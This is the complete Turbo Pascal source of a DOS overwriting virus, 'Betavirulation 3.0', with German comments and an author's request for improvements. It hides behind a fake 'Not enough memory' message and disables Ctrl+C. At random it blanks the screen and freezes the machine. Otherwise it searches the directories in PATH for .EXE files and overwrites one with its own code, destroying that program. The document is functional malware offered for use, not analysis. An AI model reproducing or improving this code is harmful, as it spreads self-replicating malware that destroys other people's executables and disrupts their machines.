{----------------------------------------------------------------------------}
{                                                                            }
{ Programm : Beta Virus                                                      }
{ Version  : 3.00                                                            }
{ Erstellt : FruiT of Eden                                                   }
{ Ausgabe  : 1) BeTAViRULaTIOn 3.0 - CODeD bY FruiT                          }
{            2) Not enough memory                                            }
{ Info     : énderungen erwÅnscht. Verbesserungen benachrichtigen.           }
{            Anregungen mir zusenden.                                        }
{ Neues    : Schnellere Dateikopierung...                                    }
{            Error behandlung...                                             }
{            AttributprÅfung...                                              }
{            Pfade werden durch PATH gesucht...                              }
{                                                                            }
{----------------------------------------------------------------------------}

program Betavirulation_3;

{----------------------------------------------------------------------------}
uses dos,crt;

var Wo, Gerade : String;                        { Das ganze }
    Pfade : Array[1..100] of String[120];       { Schonwieder ... }
    Dateien : Array[1..400] of String[120];     { soll ich noch ein }
    Gefunden, Fil_Search, i : Integer;          { INTEGER nehmen oder }
    Gleich : Boolean;                           { ist ein BYTE doch besser }
    DirInfo: SearchRec;                         { ... Da war doch noch }
    exitsave: procedure;                        { was ... ach doch WORD ? }
    afile: text;
    f: file;
    attr: Word;
{----------------------------------------------------------------------------}
Procedure Ausbruch;
const a : String = 'BeTAViRULaTIOn 3.0 - CODeD bY FruiT';
  begin
    { Packt hier rein was Ihr wollt ! }
    asm
      MOV AX, 0h                                { Clear Screen }
      INT 10h
      XOR AX, AX                                { Cursor Off }
      MOV AH, 01h
      MOV CX, 2020h
      INT 10h
    end;
    Write(a);                                   { Textausgabe }
    asm
      @START:
      JMP @START
    end;
  end;
{----------------------------------------------------------------------------}
Function Echt(Was : String) : Boolean;          { Existiert Verzeichniss ?? }
var Gerade : String;
  begin
    GetDir(0,Gerade);                           { Aktuelles Verz. Speichern }
    {$I-} ChDir(Was); {$I+}                     { In zu Testendes Verz. }
    Echt := False;                              { wechseln. }
    if IOResult = 0 then Echt := True;          { Fehler ?? }
    ChDir(Gerade)                               { In voriges Verz. wechseln }
  end;
{----------------------------------------------------------------------------}
{$F+}
procedure myexit;                               { Falls fehler auftreten }
  begin                                         { Nicht nur einige sondern }
    ClrScr;                                     { alle }
    Write('Fatal error.')
  end;
{$F-}
{----------------------------------------------------------------------------}
Procedure FileCopy(In_File, Out_File : String); { Dateien Kopieren }
var
  FromF, ToF: file;                             { Aus Turbo Pascal }
  NumRead, NumWritten: Word;                    { Hilfe BLOCKREAD... }
  buf: array[1..2048] of Char;                  { öbernommen leicht }
                                                { angepasst }
  begin
    Assign(FromF, In_File); Assign(ToF, Out_File);
    Reset(FromF, 1); Rewrite(ToF, 1);
    repeat
      BlockRead(FromF,buf,SizeOf(buf),NumRead);
      BlockWrite(ToF,buf,NumRead,NumWritten);
    until (NumRead = 0) or (NumWritten <> NumRead);
    Close(FromF);
    Close(ToF);
  end;
{----------------------------------------------------------------------------}
Begin
  { Nur dafÅr, da· ein Text nachher in der Datei sichtbar ist. }
  Gerade := 'Betavirulation bY R.t.A.r.P... Coderz. THNX 2 Banane.';

  {==============>> Error Behandlung   <<<===============}
  @exitsave := exitproc;  { speichere Original exit Procedure }
  exitproc := @myexit;    { neue Exit Procedure setzen }

  {==============>> Einstellungen      <<<===============}
  Gerade := ParamStr(0);  { Was wird gerade ausgefÅhrt ? }
  CheckBreak := False;    { schaltet CRTL+C aus }
  Randomize;              { Zufallszahlengenerator neu initialisieren }

  {==============>> Nette Sachen.....  <<<===============}
  If Random(90) = 80 then Ausbruch
    else WriteLn('Not enough memory.');

  {==============>> Suchen von Dateien <<<===============}
  Wo := GetEnv('PATH');   { in welchen Pfad befinde ich mich gerade }
  Gefunden := 1;          { wir haben ja schon das aktuelle Verzeichniss }
  GetDir(0,Pfade[1]);

  Repeat                  { Nun keine erklÑrung mehr ..... }
    Inc(Gefunden);
    Pfade[Gefunden] := Copy(Wo, 1, POS(';',Wo)-1);
    If Copy(Pfade[Gefunden], Length(Pfade[Gefunden]),1) = '\' Then
      Pfade[Gefunden] := Copy(Pfade[Gefunden],1,Length(Pfade[Gefunden])-1);
    Delete(Wo, 1, POS(';',Wo));
    Gleich := False;
    For i := 1 to Gefunden - 1 do
      If Pfade[Gefunden] = Pfade[i] then Gleich := True;
    If (Echt(Pfade[Gefunden]) = False) or (Gleich = True) then
      begin
        Pfade[Gefunden] := '';
        Dec(Gefunden)
      end;
  Until POS(';',Wo) = 0;
  If Length(Wo) > 0 Then
    begin
      Inc(Gefunden);
      Pfade[Gefunden] := Wo;
      Wo := ''
    end;
    Gleich := False;
    For i := 1 to Gefunden - 1 do
      If Pfade[Gefunden] = Pfade[i] then Gleich := True;
    If (Echt(Pfade[Gefunden]) = False) or (Gleich = True) then
      begin
        Pfade[Gefunden] := '';
        Dec(Gefunden)
      end;

    Fil_Search := 0;

    For i := 1 to Gefunden do
      begin
        FindFirst(Pfade[i]+'\*.EXE', Archive, DirInfo);
        while DosError = 0 do
          begin
            Inc(Fil_Search);
            Dateien[Fil_Search] := Pfade[i]+'\'+DirInfo.Name;
            FindNext(DirInfo)
          end
      end;                { Dies war die Dateien Suchen Rotine }

  { Ich weis ihr kînnt das viel besser, zeigt mir
    wie es geht und ich Ñndere dies ....
    Sonst bleibt da· fÅr immer und ewig so :-) }

  {==============>> Weiterkopieren     <<<===============}
  Wo := Dateien[Random(Fil_Search)+ 1];
  Assign(f, Wo);
  GetFAttr(f, attr);
  If attr = 32 then FileCopy(Gerade, Wo);

  {==============>> Error behandlung   <<<===============}
  exitproc := @exitsave;  { Original Exit Procedure wieder herstellen. }
end.
{----------------------------------------------------------------------------}
{
                         |
                       \   /
                    -----------
                    ! Mail me !
                    -----------
                        |||          ia7362@fh-wedel.de
                      __|||__
                     |___|___|


                                                                            }
